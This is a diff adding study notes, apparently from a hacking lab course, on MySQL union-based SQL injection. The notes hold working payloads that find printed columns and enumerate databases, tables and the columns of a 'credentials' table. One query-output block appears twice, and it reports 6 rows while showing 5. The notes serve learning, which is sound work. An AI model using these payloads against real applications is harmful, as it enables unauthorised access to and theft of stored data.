@@ -58,6 +58,75 @@ MariaDB [employees]> SELECT dept_no, dept_name, NULL, NULL, NULL, NULL FROM depa
 +---------+--------------------+---------+-------------+------+------------+
 ```
 ### Union Injection
+We need to determine which columns are printed to the page, to determine where to place our injection.
+```sql!
+cn' UNION select 1,2,3,4-- -
+```
+
 ```sql!
 cn' UNION select 1,user(),3,4-- -
 ```
+
+
+### Database Enumeration
+```sql!
+mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+```
+- The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.
+
+### MySQL Fingerprinting
+#### INFORMATION_SCHEMA Database
+1. List of databases
+2. List of tables within each database
+3. List of columns within each table
+
+### SCHEMATA
+```sql!
+mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+```
+
+---
+```sql!
+cn' UNION select 1,database(),2,3-- -
+```
+![](https://hackmd.io/_uploads/ryq6hYx6h.png)
+
+---
+### SCHEMATA.TABLES
+The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to.
+```sql!
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+![](https://hackmd.io/_uploads/H1UlIte6n.png)
+
+---
+### SCHEMATA.COLUMNS
+The COLUMNS table contains information about all columns present in all the databases.
+```sql!
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+![](https://hackmd.io/_uploads/Hy0VIKxp3.png)
+
+
